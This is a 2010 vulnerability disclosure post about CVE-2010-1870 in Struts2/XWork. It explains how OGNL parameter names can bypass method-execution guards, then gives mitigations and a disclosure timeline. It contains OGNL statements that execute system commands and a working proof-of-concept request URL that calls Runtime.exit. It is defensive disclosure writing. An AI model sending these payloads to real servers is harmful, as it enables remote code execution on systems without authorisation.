@@ -1,0 +1,87 @@
+Friday, July 9, 2010
+CVE-2010-1870: Struts2/XWork remote command execution
+Update Tue Jul 13 2010: Added proof of concept
+
+Apache Struts team has announced uploaded but has not released, due to an unreasonably prolonged voting process, the 2.2.0 release of the Struts2 web framework which fixes vulnerability that I've reported to them on May 31st 2010. Apache Struts team is ridiculously slow in releasing the fixed version and all of my attempts to expedite the process have failed.
+
+Introduction
+Struts2 is Struts + WebWork. WebWork in turn uses XWork to invoke actions and call appropriate setters/getters based on HTTP parameter names, which is achieved by treating each HTTP parameter name as an OGNL statement. OGNL (Object Graph Navigation Language) is what turns:
+
+user.address.city=Bishkek&user['favoriteDrink']=kumys
+
+into
+
+action.getUser().getAddress().setCity("Bishkek")
+action.getUser().setFavoriteDrink("kumys")
+
+This is performed by the ParametersInterceptor, which calls ValueStack.setValue() with user-supplied HTTP parameters as arguments.
+NOTE: If you are using XWork's ParametersInterceptor or operate with OGNL ValueStack in a similar way then you are vulnerable (ParametersInterceptor is on by default in struts-default.xml).
+
+In addition to property getting/setting, OGNL supports many more features:
+
+    * Method calling: foo()
+    * Static method calling: @java.lang.System@exit(1)
+    * Constructor calling: new MyClass()
+    * Ability to work with context variables: #foo = new MyClass()
+    * And more...
+
+Since HTTP parameter names are OGNL statements, to prevent an attacker from calling arbitrary methods via HTTP parameters XWork has the following two variables guarding methods execution:
+
+    * OgnlContext's property 'xwork.MethodAccessor.denyMethodExecution' (set to true by default)
+    * SecurityMemberAccess private field called 'allowStaticMethodAccess' (set to false by default)
+
+OGNL Context variables
+To make it easier for developer to access various frequently needed objects XWork provides several predefined context variables:
+
+    * #application
+    * #session
+    * #request
+    * #parameters
+    * #attr
+
+These variables represent various server-side objects, such as session map. To prevent attackers from tampering with server-side objects XWork's ParametersInterceptor disallowed # in parameter names. About a year ago I found a way to bypass that protection(XW-641) using Java's unicode String representation: \u0023. At the time I felt like the fix that was implemented (OGNL value stack clearing) was insufficient, but had not time to investigate this further. 
+
+CVE-2010-1870
+Earlier this year I finally got a chance to look at this again and found that in addition to the above mentioned context variables there were more:
+
+    * #context - OgnlContext, the one guarding method execution based on 'xwork.MethodAccessor.denyMethodExecution' property value.
+    * #_memberAccess - SecurityMemberAccess, whose 'allowStaticAccess' field prevented static method execution.
+    * #root
+    * #this
+    * #_typeResolver
+    * #_classResolver
+    * #_traceEvaluations
+    * #_lastEvaluation
+    * #_keepLastEvaluation
+
+You can probably see the problem already. Using XW-641 trick I was able to modify the values that were guarding Java methods execution and run arbitrary Java code:
+
+#_memberAccess['allowStaticMethodAccess'] = true
+#foo = new java .lang.Boolean("false")
+#context['xwork.MethodAccessor.denyMethodExecution'] = #foo
+#rt = @java.lang.Runtime@getRuntime()
+#rt.exec('mkdir /tmp/PWNED')
+
+Actual proof of concept had to use OGNL's expression evaluation when crafting HTTP request. PoC for this bug will be published on July 12 2010. To test whether your application is vulnerable you can use the following proof of concept, which will call java.lang.Runtime.getRuntime().exit(1):
+
+
+http://mydomain/MyStruts.action?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.den
+yMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRunti
+me()))=1
+
+
+Fixing CVE-2010-1870
+Struts2 users must upgrade to the 2.2.0, which whitelists a set of characters that excludes characters required to exploit this vulnerability.
+
+
+In cases where upgrade isn't possible you can use ParameterInterceptor's "excludeParams" parameter to whitelist the characters required for your application to operate correctly(usually A-z0-9_.'"[]) alternatively you can blacklist \()@ which are the characters required to exploit this bug.
+
+Timeline
+May 31st - email to security@struts.apache.org with vulnerability report.
+June 4th - no response received, contacted developers again.
+June 5th - had to find an XWork developer on IRC to look at this.
+June 16th - Atlassian fixes vulnerability in its products. Atlassian and Struts developers worked together in coming up with the fix.
+June 20th - 1-line fix commited
+June 29th - Struts 2.2.0 release voting process started and is still going...
+
+
